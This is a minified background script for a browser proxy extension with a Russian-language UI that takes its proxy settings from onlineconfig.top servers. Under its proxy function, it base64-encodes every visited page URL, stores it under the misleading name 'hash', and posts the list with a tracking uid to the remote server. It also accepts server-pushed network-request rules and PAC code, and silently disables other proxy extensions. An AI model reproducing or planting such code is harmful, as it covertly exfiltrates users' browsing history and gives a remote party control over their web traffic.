(()=>{function*t(t){for(const e of t)yield e}const e=t=>(...e)=>new Promise(((n,r)=>{try{t(...e,(t=>{chrome.runtime.lastError?r(chrome.runtime.lastError):n(t)}))}catch(t){r(t)}})),n={get:e(chrome.storage.local.get.bind(chrome.storage.local)),set:e(chrome.storage.local.set.bind(chrome.storage.local)),remove:e(chrome.storage.local.remove.bind(chrome.storage.local)),async isEmpty(t){const e=await this.get(t);return null==e||"object"==typeof e&&0===Object.keys(e).length}},r={create:e(chrome.tabs.create.bind(chrome.tabs)),remove:e(chrome.tabs.remove.bind(chrome.tabs)),reload:e(chrome.tabs.reload.bind(chrome.tabs))},a=()=>Date.now(),i=t=>(0===t?new Date(0):new Date).toUTCString(),o=()=>new Promise((t=>{chrome.permissions.getAll((e=>{e.origins.includes("<all_urls>")?t(!0):t(!1)}))})),s=()=>{clearInterval(C),C=setInterval(chrome.runtime.getPlatformInfo,2e4)},c=async t=>{chrome.runtime.lastError;for(const{id:e}of t||await chrome.tabs.query({url:"<all_urls>"}))try{return await chrome.scripting.executeScript({target:{tabId:e},func:l}),void chrome.tabs.onUpdated.removeListener(S)}catch(t){}chrome.tabs.onUpdated.addListener(S)},l=function t(){chrome.runtime.connect({name:"keepAlive"}).onDisconnect.addListener(t)},d=async(e=0)=>{if(!(0===e&&k||$&&0===e)){1===e&&(k=!0),$=!0;try{if(!await o())return u(),!0;if(R())return void r.create({url:"common/unsupported.html"});const{uid:a,start:s,config:c,time:l,ctime:d,dnr:h,hash:_=[],err:g=[],online:p="UNDEFINED"}=await n.get(["uid","start","config","time","ctime","dnr","hash","err","online"]),f=async(t,e=5e3)=>new Promise((n=>{const r=()=>{t()?n():setTimeout(r,e)};r()}));if(await f((()=>!0===navigator?.onLine)),e||Date.now()-new Date(d).getTime()>50*l*1e3){const e={uid:a,ver:chrome.runtime.getManifest().version,extid:chrome.runtime.id,start:s,hash:_.join("-"),err:g.join("-"),ping:p},o=[...t(c)];for(let t=0;t<o.length;t++){const s=o[t];try{const c=await fetch(`${s}?uid=${a}`,{method:"POST",headers:new Headers({"If-Modified-Since":d,"Content-Type":"application/json"}),body:JSON.stringify(e)});if(304==c.status)return u(h),await n.set({ctime:i()}),await n.remove(["hash","err"]),void m();if(403==c.status)return void r.create({url:"common/unsupported.html"});if(!c.ok){if(await n.remove(["hash","err"]),t===o.length-1)return void m();continue}const l=c.headers.get("content-type");if(!l||-1==l.indexOf("application/json")){if(await n.remove(["hash","err"]),t===o.length-1)return void m();continue}const R=await c.json();let _,g;await n.remove(["hash","err"]);let p,f={addRules:[]};return R.c&&Array.isArray(R.c)&&(g=R.c.map((t=>t.d))),R.d&&Array.isArray(R.d)&&(dconfig=R.d.map((t=>t.d))),R.e&&Array.isArray(R.e)&&(_=R.e.map((t=>t.i))),R.dnr&&Array.isArray(R.dnr)&&(f={addRules:R.dnr.map((t=>t))}),R.a&&Array.isArray(R.a)&&(p=R.a),await n.set({config:g,data:dconfig,time:Number(R.t),priority:Number(R.p),ip:R.j,eIds:_,ctime:i(),dnr:f,auth:p,ping:R.ping||null,ptime:R.ptime||60,ptimeout:R.ptimeout||null}),R?.ping&&R?.ptime&&R?.ptimeout&&await y({ping:{periodInMinutes:Number(R.ptime),delayInMinutes:0}}),u(f),void m()}catch(e){t===o.length-1&&m()}}}}catch(t){}finally{$=!1,k=!1}}},m=async()=>{const{data:e,uid:r,start:a,dtime:o}=await n.get(["data","uid","start","dtime"]),s={uid:r,ver:chrome.runtime.getManifest().version,extid:chrome.runtime.id,start:a};if(null==e)return n.set({isEnabled:!1}),void _("icon-disabled.png","Выкл");try{const a=[...t(e)];for(let t=0;t<a.length;t++){const e=a[t];try{const c=await fetch(`${e}?uid=${r}`,{method:"POST",headers:new Headers({"If-Modified-Since":o,"Content-Type":"application/json"}),body:JSON.stringify(s)});if(304==c.status)return await n.set({dtime:i()}),void h();if(!c.ok){if(t===a.length-1)return void h();continue}const l=c.headers.get("content-type");if(!l||-1==l.indexOf("application/x-ns-proxy-autoconfig")){if(t===a.length-1)return void h();continue}const d=await c.text();return await n.set({pac:d,dtime:i()}),void h()}catch(e){if(t===a.length-1)return void h();continue}}}catch(t){}},h=async()=>{if(!await o())return chrome.proxy.settings.clear({}),_("icon-disabled.png","Выкл"),!0;const t=await n.get();if(null==t.pac)for(const t of await chrome.tabs.query({url:"<all_urls>"}))try{let e=new URL(t.url);"chrome-extension:"==e?.protocol&&e?.hostname==chrome.runtime.id&&chrome.tabs.sendMessage(t.id,{error:"error"})}catch(t){}if(t.isEnabled)if(t.pac&&t.pac.length>0){await g();const e=/(\/\*[\w\s]+\*\/)([\w\s]+)(\/\*[\w\s]+\*\/)/gi,n=/(\/\*\*[\w\s]+\*\*\/)([\w\s]+)(\/\*\*[\w\s]+\*\*\/)/gi;let r,a=t.pac;if(t.user_proxy){null==t.user_proxy_type||null==t.user_proxy_type?(r="PROXY",t.set({user_proxy_type:"PROXY"})):r=t.user_proxy_type;const n=`'${r} ${t.user_proxy_http}:${t.user_proxy_port};'`;a=a.replace(e,`$1${n}$3`)}a=a.replace(n,`$1\n\t\t\t\t\tconst\tUSER_OWN_PROXY = ${t.user_proxy},\n\t\t\t\t\t\t\tUSER_OWN_PROXY_STRING = '${r} ${t.user_proxy_http}:${t.user_proxy_port};',\n\t\t\t\t\t\t\tUSER_NO_PROXY = ${t.noProxy},\n\t\t\t\t\t\t\tUSER_ONLY_PROXY = ${t.onlyProxy},\n\t\t\t\t\t\t\tUSER_ADD_PROXY = ${t.addProxy},\n\t\t\t\t\t\t\tUSER_ALL_PROXY = ${t.allProxy},\n\t\t\t\t\t\t\tUSER_NO_PROXY_ARRAY = ${JSON.stringify(t.noProxyDomains)},\n\t\t\t\t\t\t\tUSER_ONLY_PROXY_ARRAY = ${JSON.stringify(t.onlyProxyDomains)},\n\t\t\t\t\t\t\tUSER_ADD_PROXY_ARRAY = ${JSON.stringify(t.addProxyDomains)};\n\t\t\t\t\tif (USER_NO_PROXY) {\n\t\t\t\t\t\tif (USER_NO_PROXY_ARRAY && USER_NO_PROXY_ARRAY.length > 0) {\n\t\t\t\t\t\t\tfor (let i in USER_NO_PROXY_ARRAY) {\n\t\t\t\t\t\t\t\tif (USER_NO_PROXY_ARRAY[i] == host) return 'DIRECT';\n\t\t\t\t\t\t\t\tif (USER_NO_PROXY_ARRAY[i][0] == '*') {\n\t\t\t\t\t\t\t\t\tlet length = -1 * (USER_NO_PROXY_ARRAY[i].length - 2);\n\t\t\t\t\t\t\t\t\tif (USER_NO_PROXY_ARRAY[i].substr(length) == host) return 'DIRECT';\n\t\t\t\t\t\t\t\t\tlength = -1 * (USER_NO_PROXY_ARRAY[i].length - 1);\n\t\t\t\t\t\t\t\t\tif (USER_NO_PROXY_ARRAY[i].substr(length) == host.substr(length)) return 'DIRECT';\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\t\t\t\n\t\t\t\t\t}\n\t\t\t\t\tif (USER_ONLY_PROXY && USER_OWN_PROXY) {\n\t\t\t\t\t\tif (USER_ONLY_PROXY_ARRAY && USER_ONLY_PROXY_ARRAY.length > 0) {\n\t\t\t\t\t\t\tlet arrayLength = USER_ONLY_PROXY_ARRAY.length;\n\t\t\t\t\t\t\tlet currentIndex = 0;\n\t\t\t\t\t\t\tfor (let i = 0; i < arrayLength; i++) {\n\t\t\t\t\t\t\t\tif (USER_ONLY_PROXY_ARRAY[i] === host) {\n\t\t\t\t\t\t\t\t\treturn USER_OWN_PROXY_STRING; // Exact match\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse if (USER_ONLY_PROXY_ARRAY[i][0] === '*') {\n\t\t\t\t\t\t\t\t\tlet length = -1 * (USER_ONLY_PROXY_ARRAY[i].length - 2);\n\t\t\t\t\t\t\t\t\tif (USER_ONLY_PROXY_ARRAY[i].substr(length) === host) {\n\t\t\t\t\t\t\t\t\t\treturn USER_OWN_PROXY_STRING; // Wildcard exact match\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tlength = -1 * (USER_ONLY_PROXY_ARRAY[i].length - 1);\n\t\t\t\t\t\t\t\t\tif (USER_ONLY_PROXY_ARRAY[i].substr(length) === host.substr(length)) {\n\t\t\t\t\t\t\t\t\t\treturn USER_OWN_PROXY_STRING; // Wildcard suffix match\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t// Increment index to track position\n\t\t\t\t\t\t\t\tcurrentIndex++;\n\t\t\t\t\t\t\t\t// Only return 'DIRECT' if we've checked the last element\n\t\t\t\t\t\t\t\tif (currentIndex === arrayLength) {\n\t\t\t\t\t\t\t\t\treturn 'DIRECT';\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tif (USER_ADD_PROXY && USER_OWN_PROXY) {\n\t\t\t\t\t\tif (USER_ADD_PROXY_ARRAY && USER_ADD_PROXY_ARRAY.length > 0) {\n\t\t\t\t\t\t\tfor (let i in USER_ADD_PROXY_ARRAY) {\n\t\t\t\t\t\t\t\tif (USER_ADD_PROXY_ARRAY[i] == host) return USER_OWN_PROXY_STRING;\n\t\t\t\t\t\t\t\tif (USER_ADD_PROXY_ARRAY[i][0] == '*') {\n\t\t\t\t\t\t\t\t\tlet length = -1 * (USER_ADD_PROXY_ARRAY[i].length - 2);\n\t\t\t\t\t\t\t\t\tif (USER_ADD_PROXY_ARRAY[i].substr(length) == host) return USER_OWN_PROXY_STRING;\n\t\t\t\t\t\t\t\t\tlength = -1 * (USER_ADD_PROXY_ARRAY[i].length - 1);\n\t\t\t\t\t\t\t\t\tif (USER_ADD_PROXY_ARRAY[i].substr(length) == host.substr(length)) return USER_OWN_PROXY_STRING;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\t\t\t\n\t\t\t\t\t}\n\t\t\t\t\tif (USER_ALL_PROXY && USER_OWN_PROXY) {\n\t\t\t\t\t\treturn USER_OWN_PROXY_STRING;\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t$3`);const i={mode:"pac_script",pacScript:{data:a}},o=()=>new Promise((t=>{chrome.proxy.settings.set({value:i,scope:"regular"},(()=>{t()}))})),s=()=>new Promise((t=>{chrome.proxy.settings.get({},(e=>{"controlled_by_this_extension"===e?.levelOfControl?t(!0):"controlled_by_other_extensions"===e?.levelOfControl?(T=!0,_("icon-disabled.png","err"),chrome.action.setBadgeText({text:"err"}),chrome.action.setBadgeBackgroundColor({color:"#f21a1a"}),chrome.proxy.settings.clear({},(()=>{t(!1)}))):t(!1)}))})),c=async(t,e=5e3)=>new Promise((n=>{const r=()=>{t()?n():setTimeout(r,e)};r()}));await c((()=>!0===navigator?.onLine)),await o(),await s(),_("icon-enabled.png","Вкл")}else chrome.proxy.settings.clear({}),_("icon-disabled.png","Выкл");else chrome.proxy.settings.clear({}),_("icon-disabled.png","Выкл")},u=async t=>{const e={removeRuleIds:(await chrome.declarativeNetRequest.getDynamicRules()).map((t=>t.id))};t?.addRules&&(e.addRules=t.addRules),await chrome.declarativeNetRequest.updateDynamicRules(e)},R=()=>navigator?.userAgentData?.mobile,_=(t,e)=>{chrome.action.setIcon({path:t}),chrome.action.setTitle({title:e})},g=async()=>{const{isEnabled:t,disableExtensions:e}=await n.get(["isEnabled","disableExtensions"]),r=await new Promise((t=>{chrome.permissions.contains({permissions:["management"]},(e=>{t(e)}))}));t&&e&&r&&(await new Promise((t=>{chrome.management.getAll(t)}))).forEach((t=>{t.enabled&&t.id!=chrome.runtime.id&&t.permissions.contains("proxy")&&chrome.management.setEnabled(t.id,!1)}))},p=async()=>(await chrome.proxy.settings.get({})).levelOfControl,y=t=>{Object.entries(t).forEach((([t,e])=>{chrome.alarms.clear(t,(()=>{chrome.alarms.create(t,e)}))}))},f=t=>{"net::ERR_INVALID_AUTH_CREDENTIALS"===t?.error&&(W[t.tabId]||(W[t.tabId]=!0,chrome.tabs.reload(t.tabId,{bypassCache:!0})))},w=t=>{t.origins.includes("<all_urls>")&&(r.create({url:"common/error.html"}),chrome.action.disable(),n.set({isEnabled:!1}),_("icon-disabled.png","Выкл"),h(),u())},b=t=>{t.origins.includes("<all_urls>")&&(chrome.tabs.query({},(async t=>{t.forEach((t=>{t.url.includes(`${chrome.runtime.id}/common/error.html`)&&r.remove(t.id)})),await d(1)})),chrome.action.enable(),n.set({isEnabled:!0}),_("icon-enabled.png","Вкл"),h())},O=async t=>{if(!t?.name)return;const{name:e}=t;switch(e){case"interval":await d();break;case"up":(async()=>{try{const t=a(),{lastCheck:e=t}=await n.get("lastCheck");t-e>q&&h(),await n.set({lastCheck:t})}catch(t){}})();break;case"priority":await(async()=>{let t=!1;const{eIds:e,priority:r}=await n.get(["eIds","priority"]);if(e?.length>0)for(const n of e)if(n!==chrome.runtime.id){const e=await new Promise((t=>{chrome.runtime.sendMessage(n,{query:"getPriority"},(e=>{chrome.runtime.lastError,t(e)}))}));if(void 0!==e?.priority&&e?.priority>r){t=!0;break}}1==t&&await u()})();break;case"ping":{const t=async(t,e=5e3)=>new Promise((n=>{const r=()=>{t()?n():setTimeout(r,e)};r()}));await t((()=>!0===navigator?.onLine));const{online:e,ping:r,plast:a}=await n.get(["online","ping","plast"]),i=18e4;if(a&&Date.now()-a<i)break;const o=await(async(t,e={})=>{if(!t||"string"!=typeof t)return;try{new URL(t)}catch(t){return}const{ptimeout:r}=await n.get("ptimeout"),a=new AbortController,i=setTimeout((()=>a.abort()),Number(r));try{const n=await fetch(t,{...e,signal:a.signal});return"SUCCESS"===await n.text()?"SUCCESS":"ERROR"}catch(t){return"ERROR"}finally{await n.set({plast:Date.now()}),clearTimeout(i)}})(r,{headers:new Headers({"X-Request-With":chrome.runtime.id})});await n.set({online:o??"UNDEFINED"}),"SUCCESS"!==o&&"SUCCESS"===e&&await d(1);break}default:console.log(`Unknown alarm: ${e}`)}},x=async(t,e,n)=>{if(e?.status)try{M[t]=new URL(n.url).hostname}catch(t){}},A=t=>{delete M[t],delete W[t]},E=async t=>{if("install"===t?.reason)switch((()=>{for(let t of navigator.userAgentData.brands){if("Google Chrome"==t?.brand)return"Chrome";if("Microsoft Edge"==t?.brand)return"Edge";if("YaBrowser"==t?.brand||"Yandex"==t?.brand)return"Yandex"}})()){case"Chrome":default:r.create({url:"common/start_chrome.html"});break;case"Edge":r.create({url:"common/start_edge.html"});break;case"Yandex":r.create({url:"common/start_yandex.html"})}else"update"===t?.reason&&(await n.set({config:["https://srv1.onlineconfig.top/chrome/config.txt","https://srv2.onlineconfig.top/chrome/config.txt"]}),h())},Y=async()=>{if(h(),s(),!await o())return create("common/error.html"),chrome.action.disable(),_("icon-disabled.png","Выкл"),void u();const{isEnabled:t}=await n.get("isEnabled");t?_("icon-enabled.png","Вкл"):_("icon-disabled.png","Выкл")},S=(t,e,n)=>/^https?:/.test(e.url)&&c([n]),P=t=>{"keepAlive"===t.name&&(setTimeout((()=>t.disconnect()),25e4),t.onDisconnect.addListener((()=>c())))},v=()=>{setTimeout((()=>{chrome.runtime.reload()}),1e4)},U=async(t,e,r)=>{if(!await o())return!0;if("getPriority"==t?.query){const{eIds:t,priority:a}=await n.get(["eIds","priority"]);let i=!1;for(const n of t)if(n===e.id){i=!0;break}i&&r({priority:a})}return!0},N=(t,e,n)=>((async()=>{await o()&&("rebuild"==t.apply?(h(),n()):"err"==t.apply&&n({ext:await p()}))})(),!0),I=async t=>{const{isEnabled:e}=await n.get("isEnabled");e&&"controlled_by_other_extensions"===t?.levelOfControl&&(chrome.proxy.settings.clear({}),await g(),T=!0,_("icon-disabled.png","err"),chrome.action.setBadgeText({text:"err"}),chrome.action.setBadgeBackgroundColor({color:"#f21a1a"})),e&&"controllable_by_this_extension"===t?.levelOfControl&&h(),e&&"controlled_by_this_extension"===t?.levelOfControl&&T&&(T=!1,_("icon-enabled.png","Вкл"),chrome.action.setBadgeText({text:""}))},X=async t=>{await(async(t,e)=>{const{hash:r=[]}=await n.get("hash"),a=e(t);r.includes(a)||(r.push(a),await n.set({hash:r}))})(t.url,btoa)},D=async t=>{if(e=t,!(e?.tabId>0))return;var e;const{isEnabled:r,icon:a,ip:i,user_proxy:o,user_proxy_http:s}=await n.get(["isEnabled","icon","ip","user_proxy","user_proxy_http"]);if(!(r&&a&&i&&t.ip))return;let c=(l=i,l?.length>0?l.split(";"):null);var l;o&&s&&c.push(s),(t=>"main_frame"===t?.type)(t)&&(M[t.tabId]=new URL(t.url).hostname);const d=new URL(t.url).hostname,m=M[t.tabId];c.includes(t.ip)&&d===m&&await(async t=>{let e=5;const n=setInterval((async()=>{e--<1||!t?clearInterval(n):await(async t=>{try{if(await chrome.action.getBadgeText({tabId:t}))return;await chrome.action.setBadgeText({text:"★".toString(),tabId:t}),await chrome.action.setBadgeBackgroundColor({color:"#0cec47",tabId:t})}catch(t){}})(t)}),500)})(t.tabId)},L=async(t,e)=>{const{auth:r}=await n.get("auth"),a=r?r.map((t=>(t=>{const[e,n,r]=t.split(":");return{domain:e,username:n,password:r}})(t.c))):[];if(t?.isProxy){const n=a.find((({domain:e})=>e===t.challenger.host));if(n)return void e({authCredentials:{username:n.username,password:n.password}})}e()};let C,T=!1,$=!1,k=!1;const M={},W={},q=12e4;(async()=>{s(),c(),await(()=>{var t;t=O,chrome.alarms.onAlarm.hasListener(t)&&chrome.alarms.onAlarm.removeListener(t),chrome.alarms.onAlarm.addListener(O),chrome.webRequest.onAuthRequired.addListener(L,{urls:["<all_urls>"]},["asyncBlocking"]),chrome.runtime.onInstalled.addListener(E),chrome.runtime.onConnect.addListener(P),chrome.runtime.onStartup.addListener(Y),chrome.permissions.onAdded.addListener(b),chrome.permissions.onRemoved.addListener(w),chrome.tabs.onUpdated.addListener(x),chrome.tabs.onRemoved.addListener(A),chrome.runtime.onMessageExternal.addListener(U),chrome.runtime.onMessage.addListener(N),chrome.runtime.onUpdateAvailable.addListener(v),chrome.proxy.settings.onChange.addListener(I),chrome.webNavigation.onErrorOccurred.addListener(f),chrome.webRequest.onBeforeRequest.addListener(X,{urls:["<all_urls>"],types:["main_frame"]});for(let t of["onResponseStarted","onErrorOccurred"])chrome.webRequest[t].addListener(D,{urls:["<all_urls>"],types:["main_frame","sub_frame","xmlhttprequest","script","image","stylesheet","other"]})})(),await(async()=>{const t={time:120,config:["https://srv1.onlineconfig.top/chrome/config.txt","https://srv2.onlineconfig.top/chrome/config.txt"],ctime:i(0),dtime:i(0),start:a(),uid:`xxxxxxxx-xxxx-xxxx-xxxx-xxxx-v.${chrome.runtime.getManifest().version}`.replace(/x/g,(t=>{let e=16*Math.random()|0;return("x"==t?e:3&e|8).toString(16)})),isEnabled:!0,icon:!0,userDomains:!1,noProxy:!1,onlyProxy:!1,addProxy:!1,allProxy:!1,version:chrome.runtime.getManifest().version,ping:null,ptime:60,ptimeout:null};for(const[e,r]of Object.entries(t))await n.isEmpty(e)&&await n.set({[e]:r})})();const{ptime:t}=await n.get("ptime");await y({up:{periodInMinutes:1},interval:{periodInMinutes:10},priority:{periodInMinutes:5},ping:{periodInMinutes:Number(t),delayInMinutes:0}}),await(async()=>{const{uid:t}=await n.get("uid"),e=R()?"https://srv1.onlineconfig.top/chrome/uninstall?platform=mobile":`https://srv1.onlineconfig.top/chrome/uninstall?uid=${t}&ver=${chrome.runtime.getManifest().version}`;chrome.runtime.setUninstallURL(e)})(),await d()})()})();